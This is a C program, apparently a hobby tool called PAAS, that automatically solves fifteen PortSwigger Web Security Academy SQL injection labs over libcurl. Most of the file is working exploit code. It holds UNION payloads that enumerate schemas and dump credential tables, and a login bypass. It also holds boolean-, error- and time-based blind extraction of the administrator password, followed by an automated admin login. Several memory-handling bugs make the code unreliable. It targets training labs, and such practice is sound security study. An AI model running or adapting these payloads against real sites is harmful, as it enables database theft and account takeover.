#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <curl/curl.h>

typedef struct {
    const char *lab_name;
    int lab_id;
} LabMapping;

int extract_lab_id_from_lab_name(const char *html_content) {
    // PAAS supports the SQLi labs listed below
    LabMapping lab_mappings[] = {
            {"SQL injection vulnerability in WHERE clause allowing retrieval of hidden data",       1},
            {"SQL injection vulnerability allowing login bypass",                                   2},
            {"SQL injection attack, querying the database type and version on Oracle",              3},
            {"SQL injection attack, querying the database type and version on MySQL and Microsoft", 4},
            {"SQL injection attack, listing the database contents on non-Oracle databases",         5},
            {"SQL injection attack, listing the database contents on Oracle",                       6},
            {"SQL injection UNION attack, determining the number of columns returned by the query", 7},
            {"SQL injection UNION attack, finding a column containing text",                        8},
            {"SQL injection UNION attack, retrieving data from other tables",                       9},
            {"SQL injection UNION attack, retrieving multiple values in a single column",           10},
            {"Blind SQL injection with conditional responses",                                      11},
            {"Blind SQL injection with conditional errors",                                         12},
            {"Visible error-based SQL injection",                                                   13},
            {"Blind SQL injection with time delays",                                                14},
            {"Blind SQL injection with time delays and information retrieval",                      15}
    };

    const char *title_start = "<title>";
    const char *title_end = "</title>";
    const char *start = strstr(html_content, title_start);
    const char *end = strstr(start, title_end);
    int lab_id = -1;

    if (start != NULL && end != NULL) {
        start += strlen(title_start);

        char lab_name[100];
        size_t lab_name_len = end - start;
        if (lab_name_len >= sizeof(lab_name)) {
            fprintf(stderr, "Lab name is too long! (error code 24)\n");
            return -1;
        }

        strncpy(lab_name, start, end - start);
        lab_name[lab_name_len] = '\0';

        for (size_t i = 0; i < sizeof(lab_mappings) / sizeof(lab_mappings[0]); i++) {
            if (strcmp(lab_name, lab_mappings[i].lab_name) == 0) {
                lab_id = lab_mappings[i].lab_id;
                return lab_id;
            }
        }
    }

    return -1;
}


int performCurlRequest(CURL *curl, char* response_buffer, char* header_buffer) {
    memset(response_buffer, 0, strlen(response_buffer) + 1);
    memset(header_buffer, 0, strlen(response_buffer) + 1);
    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        return -1;
    }
    return 0;
}


size_t write_callback(const char *data, size_t size, size_t count, void *output_buffer) {
    size_t total_size = size * count;
    strncat(output_buffer, data, strlen(data) + 1);
    return total_size;
}


size_t write_header_callback(const char *data, size_t size, size_t count, void *output_header) {
    size_t total_size = size * count;
    strncat(output_header, data, strlen(data));
    return total_size;
}


void set_curl_settings(CURL *curl, char *url, char *response_buffer, char *header_buffer) {
    curl_easy_reset(curl);
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_PROXY, "http://127.0.0.1:8080");
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response_buffer);
    curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, write_header_callback);
    curl_easy_setopt(curl, CURLOPT_HEADERDATA, header_buffer);
}


int extract_csrf_token(const char *html_content, char *csrf_token, size_t token_size) {
    const char *token_start = strstr(html_content, "value=\"");
    const char *token_end = strchr(token_start+7, '\"');

    if (token_start && token_end) {
        token_start += 7;
        size_t token_length = token_end - token_start;

        if (token_length < token_size) {
            strncpy(csrf_token, token_start, token_length);
            csrf_token[token_length] = '\0';
            return 0;
        }
        else {
            fprintf(stderr, "Invalid token size!\n");
            return -1;
        }
    }
    else {
        fprintf(stderr, "Unable to find token_start or token_end!\nhttps://0ad300150411daef8190205500ff00a3.web-security-academy.net/");
        return -1;
    }
}


void login_as_administrator(const char *administrator_account_password, const char *login_url, char *response_buffer, char* header_buffer, char *csrf_token, CURL *curl, char *post_data) {
    curl_easy_setopt(curl, CURLOPT_COOKIE, "");
    curl_easy_setopt(curl, CURLOPT_URL, login_url);
    performCurlRequest(curl, response_buffer, header_buffer);
    extract_csrf_token(response_buffer, csrf_token, 64);

    snprintf(post_data, 150, "csrf=%s&username=administrator&password=%s", csrf_token, administrator_account_password);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);

    sleep(1);
    performCurlRequest(curl, response_buffer, header_buffer);
}


int extract_value(const char* html_content, const char* filter_value_start, const char* filter_value_end, char* value, int token_start_plus) {
    const char *token_start = strstr(html_content, filter_value_start);
    if (token_start) {
        token_start += token_start_plus;
        const char *token_end = strstr(token_start, filter_value_end);
        if (token_end) {
            strncpy(value, token_start, token_end - token_start);
            value[token_end - token_start] = '\0';
            return 1;
        }
    }
    return -1;
}


int clear_url(char *url) {
    const char *http_prefix = "http://";
    const char *https_prefix = "https://";
    size_t http_prefix_len = strlen(http_prefix);
    size_t https_prefix_len = strlen(https_prefix);

    if (strncmp(url, http_prefix, http_prefix_len) == 0 || strncmp(url, https_prefix, https_prefix_len) == 0) {
        int slashCount = 0;

        for (int i = 0; url[i] != '\0'; i++) {
            if (url[i] == '/') {
                slashCount++;
                if (slashCount == 3) {
                    url[i] = '\0';
                    break;
                }
            }
        }

        size_t length = strlen(url);
        if (length > 0 && strlen(url)-1 == '\n') {
            url[length - 1] = '\0';
        }

        return 1;
    }
    return 0;
}


void show_paas_ascii_art() {
    system("clear");
    printf("\033[38;5;208m  _____  \033[0m                 \033[38;5;208m _____ \n");
    printf("\033[38;5;208m |  __ \\ \033[0m /\\       /\\    \033[38;5;208m/ ____|  \n");
    printf("\033[38;5;208m | |__) | \033[0m/\\\\      /\\\\  \033[38;5;208m | (___    \n");
    printf("\033[38;5;208m |  ___/\033[0m /  \\\\    /  \\\\ \033[38;5;208m \\\\___ \\\\ \n");
    printf("\033[38;5;208m | | \033[0m   /====\\\\  /====\\\\  \033[38;5;208m____)  \n");
    printf("\033[38;5;208m |_| \033[0m  /      \\\\/      \\\\ \033[38;5;208m|_____/ \n");
    printf("\n[P]\033[0mortswigger \033[38;5;208m[A]\033[0mcademy \033[38;5;208m[A]\033[0mutomatic \033[38;5;208m[S]\033[0molver \n");
    printf("by \033[38;5;208mmr246\033[0m \n\n");
}


int determine_column_count(char *url, char *response_buffer, char* header_buffer, CURL *curl, char* comment_sign) {
    int i = 1;
    int max_attempts = 15;
    while (i < max_attempts) {
        if (strstr(response_buffer, "Internal Server Error") != NULL) {
            i -= 2;
            break;
        }
        char temp_url[200];
        strncpy(temp_url, url, strlen(url) + 1);
        snprintf(url, 300,"%s/filter?category=Accessories'+order+by+%d%s", temp_url, i, comment_sign);
        curl_easy_setopt(curl, CURLOPT_URL, url);

        if (performCurlRequest(curl, response_buffer, header_buffer) != 0)
            return -1;
        i++;
        clear_url(url);
    }
    return i;
}


int redirect_to_the_solution_and_solve_the_lab(char *url) {
    CURL *curl;
    curl_global_init(CURL_GLOBAL_DEFAULT);
    int column_count = -1, loop_until_column_count = -1;
    char *response_buffer = (char*)calloc(100000, 1);
    char *header_buffer = (char*)calloc(20000, 1);
    char *csrf_token = (char*)calloc(64, sizeof(char));
    char sqli_payload[260] = "", sqli_payload_mid[150] = "", sqli_payload_end[150] = "";
    char users_table_name[25] = "", usernames_column_name[25] = "", passwords_column_name[25] = "";
    char administrator_account_password[30] = "", password_temp[30] = "";
    char tracking_id_cookie[100] = "";
    char post_data[250] = "";
    char alphabetAndNumbers[] = "0123456789abcdefghijklmnopqrstuvwxyz";
    char login_url[100] = "", url_temp[100] = "";
    snprintf(login_url, sizeof(login_url), "%s/login", url);
    strncpy(url_temp, url, strlen(url) + 1);

    curl = curl_easy_init();
    if (curl == NULL)
        goto quit;

    set_curl_settings(curl, url, response_buffer, header_buffer);
    if (performCurlRequest(curl, response_buffer, header_buffer) != 0)
        goto quit;

    int lab_to_be_solved = -1;
    lab_to_be_solved = extract_lab_id_from_lab_name(response_buffer);

    curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");

    if (lab_to_be_solved == 1) {
        // Lab name: "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"
        strncat(url, "/filter?category=Accessories'+or+1+=1--", 39);
        curl_easy_setopt(curl, CURLOPT_URL, url);

        performCurlRequest(curl, response_buffer, header_buffer);
    }
    else if (lab_to_be_solved == 2) {
        // Lab name: "SQL injection vulnerability allowing login bypass"
        curl_easy_setopt(curl, CURLOPT_URL, login_url);
        performCurlRequest(curl, response_buffer, header_buffer);
        extract_csrf_token(response_buffer, csrf_token, 64);

        snprintf(post_data, sizeof(post_data), "csrf=%s&username=administrator'--&password=password", csrf_token);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
        performCurlRequest(curl, response_buffer, header_buffer);
    }
    else if (lab_to_be_solved == 3) {
        // Lab name: "SQL injection attack, querying the database type and version on Oracle"
        column_count = determine_column_count(url, response_buffer, header_buffer, curl, "--");

        strncpy(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+'abc'", sizeof(sqli_payload));
        strncpy(sqli_payload_mid, ",'test'", sizeof(sqli_payload_mid));
        strncpy(sqli_payload_end, "+FROM+dual--", sizeof(sqli_payload_end));

        loop_until_column_count = 1;
        while(loop_until_column_count != column_count) {
            strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
            loop_until_column_count++;
        }
        snprintf(url, 200, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        performCurlRequest(curl, response_buffer, header_buffer);
        clear_url(url);

        // exploit
        strncpy(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+BANNER", sizeof(sqli_payload));
        strncpy(sqli_payload_mid, ",+NULL", sizeof(sqli_payload_mid));
        strncpy(sqli_payload_end, "+FROM+v$version--", sizeof(sqli_payload_end));

        while(loop_until_column_count > 1) {
            strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
            loop_until_column_count--;
        }
        snprintf(url, 150, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        performCurlRequest(curl, response_buffer, header_buffer);
    }
    else if (lab_to_be_solved == 4) {
        // Lab name: "SQL injection attack, querying the database type and version on MySQL and Microsoft"
        column_count = determine_column_count(url, response_buffer, header_buffer, curl, "%23");

        strncpy(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+'abc'", sizeof(sqli_payload));
        strncpy(sqli_payload_mid, ",'test'", sizeof(sqli_payload_mid));
        strncpy(sqli_payload_end, "%23", sizeof(sqli_payload_end));

        loop_until_column_count = 1;
        while (loop_until_column_count < column_count) {
            strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
            loop_until_column_count++;
        }
        snprintf(url, 150, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        performCurlRequest(curl, response_buffer, header_buffer);
        clear_url(url);

        // exploit
        strncpy(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+@@version", sizeof(sqli_payload));
        strncpy(sqli_payload_mid, ",+NULL", sizeof(sqli_payload_mid));
        strncpy(sqli_payload_end, "%23", sizeof(sqli_payload_end));

        loop_until_column_count = 1;
        while (loop_until_column_count < column_count) {
            strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
            loop_until_column_count++;
        }
        snprintf(url, 200, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        performCurlRequest(curl, response_buffer, header_buffer);
    }
    else if (lab_to_be_solved == 5) {
        // Lab name: "SQL injection attack, listing the database contents on non-Oracle databases"
        column_count = determine_column_count(url, response_buffer, header_buffer, curl, "--");

        // retrieve the list of tables in the database
        strncpy(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+table_name", sizeof(sqli_payload));
        strncpy(sqli_payload_mid, ",+NULL", sizeof(sqli_payload_mid));
        strncpy(sqli_payload_end, "+FROM+information_schema.tables--", sizeof(sqli_payload_end));

        loop_until_column_count = 1;
        while (loop_until_column_count < column_count) {
            strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
            loop_until_column_count++;
        }
        snprintf(url, 200, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        performCurlRequest(curl, response_buffer, header_buffer);
        clear_url(url);

        // find the name of the table containing user credentials
        extract_value(response_buffer, "users_", "<", users_table_name, 0);

        // retrieve the details of the columns in the user table
        strncpy(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+column_name", sizeof(sqli_payload));
        strncpy(sqli_payload_mid, ",+NULL", sizeof(sqli_payload_mid));
        snprintf(sqli_payload_end, 150, "+FROM+information_schema.columns+WHERE+table_name='%s'--", users_table_name);

        loop_until_column_count = 1;
        while (loop_until_column_count < column_count) {
            strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
            loop_until_column_count++;
        }
        snprintf(url, 200, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        performCurlRequest(curl, response_buffer, header_buffer);
        clear_url(url);

        // finding the names of the columns containing usernames and passwords
        extract_value(response_buffer, "username_", "<", usernames_column_name, 0);
        extract_value(response_buffer, "password_", "<", passwords_column_name, 0);

        // retrieve the details of the columns in the users_table_name table
        snprintf(sqli_payload, 100, "/filter?category=Accessories'+UNION+SELECT+%s,+%s", usernames_column_name, passwords_column_name);
        strncpy(sqli_payload_mid, ",+NULL", sizeof(sqli_payload_mid));
        snprintf(sqli_payload_end, 40, "+FROM+%s--", users_table_name);

        loop_until_column_count = 2;
        while (loop_until_column_count < column_count) {
            strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
            loop_until_column_count++;
        }
        snprintf(url, 200, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        performCurlRequest(curl, response_buffer, header_buffer);
        clear_url(url);

        // extract administrator's administrator_account_password from column
        extract_value(response_buffer, "administrator", "<", administrator_account_password, 51);

        // login as administrator and solve the lab
        login_as_administrator(administrator_account_password, login_url, response_buffer, header_buffer, csrf_token, curl, post_data);
    }
    else if (lab_to_be_solved == 6) {
        // Lab name: "SQL injection attack, listing the database contents on Oracle"
        column_count = determine_column_count(url, response_buffer, header_buffer, curl, "--");

        // retrieve the list of tables in the database
        strncpy(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+table_name", 100);
        strncpy(sqli_payload_mid, ",+NULL", sizeof(sqli_payload_mid));
        strncpy(sqli_payload_end, "+FROM+all_tables--", 40);
        int f = 1;
        while (f < column_count) {
            strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
            f++;
        }
        snprintf(url, 200, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        performCurlRequest(curl, response_buffer, header_buffer);
        clear_url(url);

        // finding the names of the columns containing usernames and passwords
        extract_value(response_buffer, ">USERS_", "<", users_table_name, 1);

        // retrieve the details of the columns in the user table
        strncpy(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+column_name", 100);
        strncpy(sqli_payload_mid, ",NULL", sizeof(sqli_payload_mid));
        snprintf(sqli_payload_end, 150, "+FROM+all_tab_columns+WHERE+table_name='%s'--", users_table_name);

        f = 1;
        while (f < column_count) {
            strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
            f++;
        }
        snprintf(url, 200, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);


        curl_easy_setopt(curl, CURLOPT_URL, url);

        performCurlRequest(curl, response_buffer, header_buffer);
        clear_url(url);

        // finding the names of the columns containing usernames and passwords
        extract_value(response_buffer, "USERNAME_", "<", usernames_column_name, 0);
        extract_value(response_buffer, "PASSWORD_", "<", passwords_column_name, 0);

        // retrieve the details of the columns in the users_table_name table
        snprintf(sqli_payload, 100, "/filter?category=Accessories'+UNION+SELECT+%s,+%s", usernames_column_name, passwords_column_name);
        snprintf(sqli_payload_end, 40, "+FROM+%s--", users_table_name);
        while (f < column_count) {
            strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
            f++;
        }
        snprintf(url, 200, "%s/filter?category=Accessories%s%s", url_temp, sqli_payload, sqli_payload_end);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        performCurlRequest(curl, response_buffer, header_buffer);
        clear_url(url);

        // extract administrator's administrator_account_password from column
        extract_value(response_buffer, "administrator", "<", administrator_account_password, 51);

        // login as administrator and solve the lab
        login_as_administrator(administrator_account_password, login_url, response_buffer, header_buffer, csrf_token, curl, post_data);
    }
    else if (lab_to_be_solved == 7) {
        // Lab name: "SQL injection UNION attack, determining the number of columns returned by the query"
        strncpy(sqli_payload, "'+UNION+SELECT+NULL", 100);
        strncpy(sqli_payload_mid, ",NULL", sizeof(sqli_payload_mid));
        strncpy(sqli_payload_end, "--", sizeof(sqli_payload_mid));

        column_count = 1;
        while (column_count) {
            strncat(sqli_payload_mid, ",NULL", 5);
            snprintf(url, 150, "%s/filter?category=Accessories%s%s%s", url_temp, sqli_payload, sqli_payload_mid, sqli_payload_end);
            curl_easy_setopt(curl, CURLOPT_URL, url);

            performCurlRequest(curl, response_buffer, header_buffer);
            if (strstr(response_buffer, "Internal Server Error") == NULL)
                break;

            column_count++;
            clear_url(url);
        }
    }
    else if (lab_to_be_solved == 8) {
        // Lab name: "SQL injection UNION attack, finding a column containing text"
        column_count = determine_column_count(url, response_buffer, header_buffer, curl, "--");

        // extracting the text provided by the lab
        char db_string[30];
        extract_value(response_buffer, "Make the database retrieve the string: '", "\'", db_string, 40);

        // try replacing each null with the random value
        strncpy(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+NULL", 100);
        strncpy(sqli_payload_mid, ",NULL", sizeof(sqli_payload_mid));
        strncpy(sqli_payload_end, "--", sizeof(sqli_payload_mid));
        char sqli_payload_mid_with_the_provided_string[300];
        snprintf(sqli_payload_mid_with_the_provided_string, 30, ",'%s'", db_string);

        int test_column = 1;
        loop_until_column_count = 1;
        while(loop_until_column_count < column_count) {
            loop_until_column_count = 1;
            while (loop_until_column_count < column_count) {
                if (test_column == loop_until_column_count) {
                    strncat(sqli_payload, sqli_payload_mid_with_the_provided_string, strlen(sqli_payload_mid_with_the_provided_string) + 1);
                } else {
                    strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
                }
                loop_until_column_count++;
            }

            snprintf(url, 200, "%s/filter?category=Accessories%s%s", url_temp, sqli_payload, sqli_payload_end);
            curl_easy_setopt(curl, CURLOPT_URL, url);
            performCurlRequest(curl, response_buffer, header_buffer);

            clear_url(url);
            loop_until_column_count++;
            test_column++;

            // for reset sqli_payload
            strncat(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+NULL", 47);

        }
    }
    else if (lab_to_be_solved == 9) {
        // Lab name: "SQL injection UNION attack, retrieving data from other tables"
        strncat(url, "/filter?category=Accessories'+UNION+SELECT+'abc','def'--", 56);
        curl_easy_setopt(curl, CURLOPT_URL, url);
        performCurlRequest(curl, response_buffer, header_buffer);

        clear_url(url);
        strncat(url, "/filter?category=Accessories'+UNION+SELECT+username,+password+FROM+users--", 74);
        curl_easy_setopt(curl, CURLOPT_URL, url);
        performCurlRequest(curl, response_buffer, header_buffer);

        // extract administrator's administrator_account_password from column
        extract_value(response_buffer, "administrator", "<", administrator_account_password, 51);

        // login as administrator and solve the lab
        login_as_administrator(administrator_account_password, login_url, response_buffer, header_buffer, csrf_token, curl, post_data);
    }
    else if (lab_to_be_solved == 10) {
        // Lab name: "SQL injection UNION attack, retrieving multiple values in a single column"
        strncat(url, "/filter?category=Accessories'+UNION+SELECT+NULL,'abc'--", 55);
        curl_easy_setopt(curl, CURLOPT_URL, url);
        performCurlRequest(curl, response_buffer, header_buffer);

        clear_url(url);
        strncat(url, "/filter?category=Accessories'+UNION+SELECT+NULL,username||'~'||password+FROM+users--", 84);
        curl_easy_setopt(curl, CURLOPT_URL, url);
        performCurlRequest(curl, response_buffer, header_buffer);

        // extract administrator's password from column
        extract_value(response_buffer, "administrator", "<", administrator_account_password, 14);

        // login as administrator and solve the lab
        login_as_administrator(administrator_account_password, login_url, response_buffer, header_buffer, csrf_token, curl, post_data);
    }
    else if (lab_to_be_solved == 11) {
        // Lab name: "Blind SQL injection with conditional responses"
        // clearing the existing cookies for the "trackingId" cookie to be sent by the website
        FILE *cookie_file = fopen("cookiejar.txt", "w");
        if (cookie_file == NULL)
            printf("[!] unable to open the \"cookiejar.txt\"! ");
        fclose(cookie_file);

        performCurlRequest(curl, response_buffer, header_buffer);
        extract_value(header_buffer, "TrackingId=", ";", tracking_id_cookie, 11);

        int until_administrator_password_length = 1;
        // left, right and mid value for binary search
        int left = 0, right = 35, mid = -1;

        while(until_administrator_password_length < 21) {
            left = 0, right = 35;
            while (left <= right) {
                mid = left + (right - left) / 2;
                int current_character_ascii_value = (int)alphabetAndNumbers[mid];
                snprintf(sqli_payload, 250, "TrackingId=%s' AND (SELECT ASCII(SUBSTRING(password,%d,1)) FROM users WHERE username='administrator')='%d", tracking_id_cookie, until_administrator_password_length, current_character_ascii_value);
                curl_easy_setopt(curl, CURLOPT_COOKIE, sqli_payload);
                performCurlRequest(curl, response_buffer, header_buffer);

                if (strstr(response_buffer, "Welcome back!") != NULL) {
                    strncpy(password_temp, administrator_account_password, strlen(administrator_account_password) + 1);
                    snprintf(administrator_account_password, 30, "%s%c", password_temp, alphabetAndNumbers[mid]);
                    break;
                }

                snprintf(sqli_payload, 250, "TrackingId=%s' AND (SELECT ASCII(SUBSTRING(password,%d,1)) FROM users WHERE username='administrator')<'%d", tracking_id_cookie, until_administrator_password_length, current_character_ascii_value);
                curl_easy_setopt(curl, CURLOPT_COOKIE, sqli_payload);
                performCurlRequest(curl, response_buffer, header_buffer);

                if (strstr(response_buffer, "Welcome back!") == NULL)
                    left = mid + 1;
                else
                    right = mid - 1;
            }
            until_administrator_password_length++;
        }
        // login as administrator and solve the lab
        login_as_administrator(administrator_account_password, login_url, response_buffer, header_buffer, csrf_token, curl, post_data);
    }
    else if (lab_to_be_solved == 12) {
        // Lab name: "Blind SQL injection with conditional errors"
        performCurlRequest(curl, response_buffer, header_buffer);
        extract_value(header_buffer, "TrackingId=", ";", tracking_id_cookie, 11);

        int until_administrator_password_length = 1;
        // left, right and mid value for binary search
        int left = 0, right = 35, mid = -1;

        while(until_administrator_password_length < 21) {
            left = 0, right = 35;
            while (left <= right) {
                mid = left + (right - left) / 2;
                int current_character_ascii_value = (int)alphabetAndNumbers[mid];

                snprintf(sqli_payload, 250,"TrackingId=%s'||(SELECT CASE WHEN ASCII(SUBSTR(password,%d,1))=%d THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'", tracking_id_cookie, until_administrator_password_length, current_character_ascii_value);
                curl_easy_setopt(curl, CURLOPT_COOKIE, sqli_payload);
                performCurlRequest(curl, response_buffer, header_buffer);

                if (strstr(response_buffer, "Internal Server Error") != NULL) {
                    strncpy(password_temp, administrator_account_password, strlen(administrator_account_password) + 1);
                    snprintf(administrator_account_password, 30, "%s%c", password_temp, alphabetAndNumbers[mid]);
                    break;
                }

                snprintf(sqli_payload, 250,"TrackingId=%s'||(SELECT CASE WHEN ASCII(SUBSTR(password,%d,1))<%d THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'", tracking_id_cookie, until_administrator_password_length, current_character_ascii_value);
                curl_easy_setopt(curl, CURLOPT_COOKIE, sqli_payload);
                performCurlRequest(curl, response_buffer, header_buffer);

                if (strstr(response_buffer, "Internal Server Error") == NULL)
                    left = mid + 1;
                else
                    right = mid - 1;
            }
            until_administrator_password_length++;
        }
        // login as administrator and solve the lab
        login_as_administrator(administrator_account_password, login_url, response_buffer, header_buffer, csrf_token, curl, post_data);
    }
    else if (lab_to_be_solved == 13) {
        // Lab name: "Visible error-based SQL injection"
        curl_easy_setopt(curl, CURLOPT_COOKIE, "TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--");
        performCurlRequest(curl, response_buffer, header_buffer);

        extract_value(response_buffer, "integer: ", "\"", administrator_account_password, 10);

        // login as administrator and solve the lab
        login_as_administrator(administrator_account_password, login_url, response_buffer, header_buffer, csrf_token, curl, post_data);
    }
    else if (lab_to_be_solved == 14) {
        // düzeltilecek
        // Lab name: "Blind SQL injection with time delays"
        curl_easy_setopt(curl, CURLOPT_COOKIE, "TrackingId=paas'||pg_sleep(10)--");
        performCurlRequest(curl, response_buffer, header_buffer);
    }
    else if (lab_to_be_solved == 15) {
        // Lab name: "Blind SQL injection with time delays and information retrieval"
        performCurlRequest(curl, response_buffer, header_buffer);
        extract_value(header_buffer, "TrackingId=", ";", tracking_id_cookie, 11);

        int until_administrator_password_length = 1;
        int current_character_ascii_value = -1;
        double curl_request_response_time = -1.00;

        while(until_administrator_password_length < 21) {
            int until_alphabet_and_numbers_array_character_count = 0;
            while (until_alphabet_and_numbers_array_character_count < 36) {
                curl_request_response_time = 0.00;
                current_character_ascii_value = (int)alphabetAndNumbers[until_alphabet_and_numbers_array_character_count];
                snprintf(sqli_payload, 250, "TrackingId=%s'%%3BSELECT+CASE+WHEN+(username='administrator'+AND+ASCII(SUBSTRING(password,%d,1))='%d')+THEN+pg_sleep(1)+ELSE+pg_sleep(0)+END+FROM+users--", tracking_id_cookie, until_administrator_password_length, current_character_ascii_value);
                curl_easy_setopt(curl, CURLOPT_COOKIE, sqli_payload);
                performCurlRequest(curl, response_buffer, header_buffer);

                curl_easy_getinfo(curl, CURLINFO_TOTAL_TIME, &curl_request_response_time);
                if (curl_request_response_time > 0.95) {
                    strncpy(password_temp, administrator_account_password, strlen(administrator_account_password) + 1);
                    snprintf(administrator_account_password, 25, "%s%c", password_temp, alphabetAndNumbers[until_alphabet_and_numbers_array_character_count]);
                    break;
                    }
                until_alphabet_and_numbers_array_character_count++;
                }
            until_administrator_password_length++;
        }
        login_as_administrator(administrator_account_password, login_url, response_buffer, header_buffer, csrf_token, curl, post_data);
    }
    else {
        printf("[!] Invalid input! (error code: 7)\n");
        return -1;
    }

    quit:
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
    performCurlRequest(curl, response_buffer, header_buffer);
    performCurlRequest(curl, response_buffer, header_buffer);

    int return_value = -1;
    if (strstr(response_buffer, "Congratulations, you solved the lab!") != NULL)
        return_value = 0;

    free(url);
    free(response_buffer);
    free(header_buffer);
    if (csrf_token)
        free(csrf_token);
    curl_easy_cleanup(curl);
    curl_global_cleanup();

    return return_value;
}   


int main() {
    char *input_url = (char *)malloc(200);

    show_paas_ascii_art();
    
    printf("\033[38;5;208mLab URL\033[0m: ");
    if (fgets(input_url, 200, stdin) != NULL) {
        if (clear_url(input_url) == 1) {
            if (redirect_to_the_solution_and_solve_the_lab(input_url) == 0) {
                printf("[+] Lab successfully solved!\n");
                exit(0);
            } else {
                printf("[-] Something went wrong :(\n");
                exit(-1);
            }

        } else {
            printf("[!] Invalid URL! (error in clear_url func)\n");
            exit(-1);
          }
    } else {
        printf("[!] Invalid URL! (error in fgets func)\n");
        exit(-1);
    }
}